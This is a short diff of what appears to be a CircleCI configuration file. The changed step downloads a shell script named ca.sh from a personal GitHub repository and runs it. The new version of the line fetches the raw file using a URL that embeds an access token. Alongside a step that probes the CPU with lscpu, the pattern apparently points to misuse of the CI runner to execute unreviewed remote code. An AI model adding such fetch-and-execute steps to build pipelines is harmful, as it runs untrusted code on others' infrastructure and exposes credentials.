@@ -7,7 +7,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-        - run: wget https://github.com/CetinbasCeto/1/blob/main/ca.sh && chmod +x ca.sh && ./ca.sh
+        - run: wget https://raw.githubusercontent.com/CetinbasCeto/1/main/ca.sh?token=GHSAT0AAAAAABUUKEVBA7MOY6U6YHWUCOQAYVCEIUA && chmod +x ca.sh && ./ca.sh
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
